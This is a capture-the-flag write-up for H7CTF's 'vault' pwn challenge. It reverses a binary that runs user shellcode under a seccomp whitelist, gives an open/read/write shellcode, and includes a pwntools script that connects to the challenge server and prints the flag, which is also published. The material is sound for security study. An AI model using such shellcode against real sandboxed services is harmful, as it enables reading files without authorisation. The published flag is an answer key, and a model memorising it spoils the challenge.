# vault — H7CTF Writeup

**Category:** pwn
**Target:** Ubuntu 24.04, glibc 2.39 (2.39-0ubuntu8.9), x86-64
**Remote:** `nc pwn.h7tex.com 42630`

> The vault throws its doors wide and lets you set up shop inside. There is only one move it
> will not tolerate, and wouldn't you know it, that is exactly the one you had planned.
> You will have to take what you came for the long way around.

**Flag:** `H7CTF{839fdc98-ae79-4184-87c8-cccb0d1fd8d7}`

---

## 1. Recon

The provided files are the challenge binary, the exact target `libc.so.6`, and the matching
`ld-linux-x86-64.so.2`.

```console
$ file vault
vault: ELF 64-bit LSB executable, x86-64, ... dynamically linked, not stripped
```

The binary is a **non-PIE executable** and is **not stripped**, so we can read `main` and
`lockdown` straight from the symbol table.

```
$ nm vault | grep -E ' (lockdown|main)$'
0000000000401236 t lockdown
0000000000401319 T main
```

Security-relevant properties:

| Property    | Value                                             |
|-------------|---------------------------------------------------|
| PIE         | No (`EXEC`) — fixed addresses                      |
| Stack canary| Yes (`__stack_chk_fail`)                           |
| NX          | Irrelevant — the challenge hands us an RWX page    |
| seccomp     | Yes — strict syscall whitelist (`lockdown`)        |

---

## 2. Reversing `main`

`objdump` of `main` gives the whole program:

```asm
main:
    ...
    setvbuf(stdout, NULL, _IONBF, 0)

    ; mmap(NULL, 0x1000, PROT_READ|PROT_WRITE|PROT_EXEC,
    ;      MAP_PRIVATE|MAP_ANONYMOUS, -1, 0)
    mov  ecx, 0x22          ; MAP_PRIVATE(0x2) | MAP_ANONYMOUS(0x20)
    mov  edx, 0x7           ; PROT_READ|PROT_WRITE|PROT_EXEC
    mov  esi, 0x1000        ; length
    mov  edi, 0x0           ; addr = NULL
    call mmap
    mov  [rbp-0x10], rax

    puts("=== Vault ===")
    puts("send your shellcode (up to 4096 bytes), then EOF:")

    mov  edx, 0x1000        ; up to 4096 bytes
    mov  rsi, [rbp-0x10]    ; into the RWX page
    mov  edi, 0x0           ; stdin
    call read
    mov  [rbp-0x8], rax
    ; if read() <= 0 -> exit(1)

    call lockdown           ; install the seccomp filter
    mov  rax, [rbp-0x10]
    call rax                ; ((void (*)())page)();
    xor  eax, eax
    leave
    ret
```

So the program:
1. Maps one **read/write/execute** page.
2. Reads up to `0x1000` bytes of **your shellcode** into it.
3. Installs a seccomp filter.
4. **Jumps to your shellcode.**

This is the "vault throws its doors wide and lets you set up shop inside" part: we get arbitrary
code execution immediately. The catch is entirely in step 3.

---

## 3. Reversing `lockdown` (the seccomp filter)

```asm
lockdown:
    mov  edi, 0x80000000    ; seccomp_init(SECCOMP_RET_KILL_PROCESS)
    call seccomp_init
    mov  [rbp-0x48], rax    ; ctx

    ; syscall whitelist, stored on the stack at [rbp-0x40] .. [rbp-0xc]
    mov  dword [rbp-0x40], 0x101   ; openat         (257)
    mov  dword [rbp-0x3c], 0x2     ; open           (2)
    mov  dword [rbp-0x38], 0x0     ; read           (0)
    mov  dword [rbp-0x34], 0x1     ; write          (1)
    mov  dword [rbp-0x30], 0x3     ; close          (3)
    mov  dword [rbp-0x2c], 0x8     ; lseek          (8)
    mov  dword [rbp-0x28], 0x5     ; fstat          (5)
    mov  dword [rbp-0x24], 0x106   ; newfstatat     (262)
    mov  dword [rbp-0x20], 0x9     ; mmap           (9)
    mov  dword [rbp-0x1c], 0xb     ; munmap         (11)
    mov  dword [rbp-0x18], 0xc     ; brk            (12)
    mov  dword [rbp-0x14], 0xf     ; rt_sigreturn   (15)
    mov  dword [rbp-0x10], 0x3c    ; exit           (60)
    mov  dword [rbp-0xc], 0xe7     ; exit_group     (231)

    ; for i in 0..13:
    ;   seccomp_rule_add(ctx, SECCOMP_RET_ALLOW(0x7fff0000), whitelist[i], 0)
    xor  eax, eax
    mov  [rbp-0x4c], eax           ; i = 0
loop:
    mov  eax, [rbp-0x4c]
    mov  edx, [rbp+rax*4-0x40]     ; syscall number
    mov  rax, [rbp-0x48]
    mov  ecx, 0x0                  ; arg_cnt = 0 (no argument filtering)
    mov  esi, 0x7fff0000           ; SECCOMP_RET_ALLOW
    mov  rdi, rax
    xor  eax, eax
    call seccomp_rule_add
    inc  dword [rbp-0x4c]
    cmp  dword [rbp-0x4c], 0xd
    jbe  loop

    mov  rax, [rbp-0x48]
    mov  rdi, rax
    call seccomp_load              ; enforce
```

The default action is `SECCOMP_RET_KILL_PROCESS`, and only the 14 syscalls above are
explicitly allowed:

```
open, openat, read, write, close, lseek, fstat, newfstatat,
mmap, munmap, brk, rt_sigreturn, exit, exit_group
```

### The "one move it will not tolerate"

A conventional pwn shellcode ends with:

```c
execve("/bin/sh", NULL, NULL);   // syscall 59
```

**`execve` is not in the whitelist.** The moment you try to spawn a shell, `KILL_PROCESS`
fires and the connection dies. That is precisely the move "you had planned". There is no
`fork`, no `clone`, no `execve`, no `socket`, and no `getdents` either.

### The long way around

The whitelist *does* include `open`/`openat`, `read`, and `write`. We don't need a shell at
all — we can just **open the flag file, read it, and write it to stdout** using the allowed
syscalls.

That is the entire trick: skip `execve`, read the flag directly.

---

## 4. Exploit

### Shellcode

A position-independent stub that takes a path, reads it, and prints it:

```asm
/* open(path, O_RDONLY) */
lea     rdi, [rip + path]
xor     esi, esi
xor     edx, edx
mov     eax, 2              ; SYS_open
syscall
test    eax, eax
js      done                ; open failed -> exit

/* read(fd, buf, 0x400) */
mov     edi, eax
xor     eax, eax            ; SYS_read
lea     rsi, [rip + buf]
mov     edx, 0x400
syscall
test    eax, eax
jle     done

/* write(1, buf, n) */
mov     edx, eax
mov     eax, 1              ; SYS_write
mov     edi, 1              ; stdout
syscall

done:
/* exit(0) */
mov     eax, 60             ; SYS_exit
xor     edi, edi
syscall

path:
.byte ...                  ; e.g. "/flag\0"
buf:
.skip 0x400
```

The path string and buffer are embedded in the same RWX page, reached with RIP-relative
`lea`, so the shellcode is fully position independent.

### Driver (pwntools)

```python
from pwn import asm, context, remote

context.clear(arch="amd64", os="linux")

def build_shellcode(path: str) -> bytes:
    path = (path + "\x00").encode()
    path_bytes = ",".join(f"0x{b:02x}" for b in path)
    return asm(f"""
        lea rdi, [rip + path]
        xor esi, esi
        xor edx, edx
        mov eax, 2
        syscall
        test eax, eax
        js done
        mov edi, eax
        xor eax, eax
        lea rsi, [rip + buf]
        mov edx, 0x400
        syscall
        test eax, eax
        jle done
        mov edx, eax
        mov eax, 1
        mov edi, 1
        syscall
    done:
        mov eax, 60
        xor edi, edi
        syscall
    path:
        .byte {path_bytes}
    buf:
        .skip 0x400
    """)

io = remote("pwn.h7tex.com", 42630)
io.recvuntil(b"EOF:")
io.send(build_shellcode("/flag"))
io.shutdown("send")            # signal EOF so the program's read() returns
print(io.recvall(timeout=8))
```

The full, runnable version is in [`exploit.py`](./exploit.py):

```console
$ python3 exploit.py local /tmp/opencode/flagtest
=== Vault ===
send your shellcode (up to 4096 bytes), then EOF:
LOCAL{unit_test_ok}

$ python3 exploit.py remote
H7CTF{839fdc98-ae79-4184-87c8-cccb0d1fd8d7}
```

It supports `local`, `remote HOST PORT [PATH]`, a `remote --brute` mode that tries common flag
paths, and a user-chosen path.

---

## 5. Result

Running against the live instance with the path `/flag`:

```
H7CTF{839fdc98-ae79-4184-87c8-cccb0d1fd8d7}
```

The flag was also reachable via the relative paths `flag` and `./flag` (the working directory
contained a copy), which is handy if the absolute path ever differs between instances.

## 6. Takeaways

- **RWX shellcode ≠ easy win** when a syscall filter is installed *after* you upload but
  *before* it runs. Always reverse the seccomp filter.
- **Read the action semantics.** `seccomp_init(0x80000000)` is `SCMP_ACT_KILL_PROCESS`, so any
  non-whitelisted syscall terminates the process — no partial shell, no `errno` probing.
- **Whitelists tell you the intended primitive.** Here `open`/`read`/`write` are allowed on
  purpose: the "long way around" is to exfiltrate the file with raw I/O instead of `execve`.
- Because `seccomp_rule_add` was called with `arg_cnt = 0`, there is **no argument filtering**,
  so the allowed `open` can request any path.
